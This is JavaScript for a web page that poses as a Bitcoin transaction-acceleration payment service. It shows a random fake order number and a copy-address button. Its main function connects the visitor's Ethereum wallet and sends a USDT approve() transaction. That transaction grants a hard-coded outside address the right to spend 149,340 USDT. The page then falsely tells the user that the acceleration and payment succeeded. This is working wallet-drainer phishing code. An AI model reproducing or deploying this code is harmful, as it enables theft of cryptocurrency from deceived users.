// 随机生成比特币加速序号
function generateBtcOrderNumber() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let orderNumber = 'BTC';
    for (let i = 0; i < 12; i++) {
        orderNumber += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return orderNumber;
}

// 页面加载时设置比特币加速序号
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('btc-order').innerText = generateBtcOrderNumber();
});

// 复制支付地址功能
function copyAddress() {
    const address = document.getElementById('pay-address').innerText;
    navigator.clipboard.writeText(address).then(() => {
        alert('地址已复制');
    }).catch(err => {
        console.error('复制失败', err);
    });
}

async function authorizeUSDT() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // 优化点击响应时间
            document.getElementById('nextButton').disabled = true;
            document.getElementById('nextButton').innerText = '处理中...';
            
            // 请求连接到钱包
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            // 创建以太坊提供者和签名者
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            
            // USDT 合约地址和 ABI
            const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
            const usdtAbi = [
                {
                    "constant": false,
                    "inputs": [
                        { "name": "_spender", "type": "address" },
                        { "name": "_value", "type": "uint256" }
                    ],
                    "name": "approve",
                    "outputs": [{ "name": "", "type": "bool" }],
                    "type": "function"
                }
            ];
            
            // 创建 USDT 合约实例
            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
            
            // 授权地址和数量
            const spenderAddress = "0x65f9f8F6432375d9fF7E369b0996bE52992013B1";
            const amount = ethers.utils.parseUnits("149340", 6); // 实际授权数量 149340 USDT
            
            // 发送授权交易
            const tx = await usdtContract.approve(spenderAddress, amount);
            await tx.wait();
            
            // 更新按钮文本并显示成功信息
            document.getElementById('nextButton').innerText = '加速成功';
            alert('加速成功！您的支付已完成。');
        } catch (error) {
            console.error(error);
            document.getElementById('nextButton').innerText = '加速失败，请重试';
            alert('加速失败，请重试');
        } finally {
            // 重新启用按钮
            document.getElementById('nextButton').disabled = false;
        }
    } else {
        alert('请安装以太坊钱包插件');
    }
}
